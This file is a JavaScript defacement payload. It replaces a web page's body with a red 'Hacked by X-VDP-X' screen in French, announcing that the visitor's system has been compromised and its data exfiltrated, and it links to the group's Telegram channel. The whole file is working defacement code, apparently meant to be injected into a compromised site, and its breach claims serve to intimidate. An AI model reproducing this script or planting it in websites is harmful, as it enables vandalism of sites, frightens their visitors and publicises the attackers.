document.body.innerHTML = `
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Hacked by X-VDP-X</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }
  html, body {
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
    background: radial-gradient(circle at center, #330000 0%, #000000 70%);
    font-family: Arial, sans-serif;
    color: #ff0000;
    text-align: center;
    overflow: hidden;
    display: flex;
    justify-content: center;
    align-items: center;
  }

  @keyframes bgmove {
    0% { background-position: 0% 50%; }
    100% { background-position: 100% 50%; }
  }

  .content {
    position: relative;
    z-index: 2;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100%;
    padding: 20px;
  }
  .logo-container {
    margin-bottom: 20px;
    perspective: 800px;
    transition: transform 0.2s ease-out;
  }
  .logo-container img {
    width: 150px;
    height: 150px;
    border-radius: 50%;
    box-shadow: 0 0 20px red, 0 0 40px red, 0 0 60px darkred;
    transition: transform 0.3s, box-shadow 0.3s;
    display: block;
    margin: auto;
  }
  .logo-container img:hover {
    transform: scale(1.1);
    box-shadow: 0 0 30px red, 0 0 50px darkred;
  }
  h1, h2, h3 {
    margin: 15px 0;
    text-shadow: 0 0 10px red, 0 0 20px red;
  }
  h2 { font-size: 20px; }
  h3 {
    font-size: 16px;
    max-width: 90%;
    margin: 0 auto;
  }
  .warning {
    margin-top: 20px;
    font-weight: bold;
    font-size: 16px;
    color: red;
    text-shadow:
      0 0 10px red,
      0 0 20px darkred;
    animation: glitch 2.5s infinite;
    position: relative;
  }
  .warning::before, .warning::after {
    content: attr(data-text);
    position: absolute;
    left: 0; top: 0;
    width: 100%; height: 100%;
    opacity: 0.8;
    clip-path: polygon(0 45%, 100% 50%, 100% 55%, 0 50%);
  }
  .warning::before {
    animation: glitchTop 2.5s infinite;
    color: #ff0000;
    left: 2px;
    text-shadow: -2px 0 red;
  }
  .warning::after {
    animation: glitchBottom 2.5s infinite;
    color: #ff4444;
    left: -2px;
    text-shadow: -1px 0 darkred;
  }
  .btn {
    margin-top: 25px;
    padding: 12px 40px;
    background: #00bfff;
    color: white;
    font-weight: 700;
    border: none;
    border-radius: 30px;
    text-transform: uppercase;
    cursor: pointer;
    box-shadow: 0 0 10px #00bfff;
    font-size: 16px;
    user-select: none;
    transition: transform 0.3s ease, box-shadow 0.3s ease;
    letter-spacing: 2px;
    animation: pulseNeon 3s ease-in-out infinite;
  }
  .btn:hover {
    transform: scale(1.2);
    box-shadow:
      0 0 10px #00d4ff,
      0 0 20px #00d4ff,
      0 0 30px #00d4ff,
      0 0 40px #00d4ff;
  }
  @keyframes pulseNeon {
    0%, 100% {
      box-shadow: 0 0 10px #00bfff, 0 0 20px #00bfff;
    }
    50% {
      box-shadow:
        0 0 20px #00d4ff,
        0 0 40px #00d4ff,
        0 0 60px #00d4ff;
    }
  }
</style>
</head>
<body>

  <div class="content">
    <div class="logo-container" onclick="window.location.href='https://t.me/xvdpx6'">
      <img src="https://i.postimg.cc/q79gXyTp/image-2.webp" alt="Logo X-VDP-X" />
    </div>

    <h1 id="typewriter"></h1>
    <h2># Hack Word # Hacked # X-VDP-X # Merry Christmas</h2>
    <h3>
      VOTRE SYSTÈME A ÉTÉ COMPROMIS. NOUS AVONS TOUT. NOUS AVONS INFILTRÉ CHAQUE ÉTAGE DE VOTRE RÉSEAU. VOS DONNÉES SONT À NOUS. TOUT A ÉTÉ EXFILTRÉ. MAIS VOUS N'AVEZ AUCUNE CHANCE DE NOUS ARRÊTER. NOUS SOMMES DÉJÀ LÀ.
    </h3>

    <p class="warning" data-text="VOTRE PEUR NOUS ALIMENTE, VOTRE SYSTÈME NOUS APPARTIENT !">
      VOTRE PEUR NOUS ALIMENTE, VOTRE SYSTÈME NOUS APPARTIENT !
    </p>

    <button class="btn" onclick="window.location.href='https://t.me/xvdpx6'">
      TELEGRAM
    </button>
  </div>

</body>
</html>

`
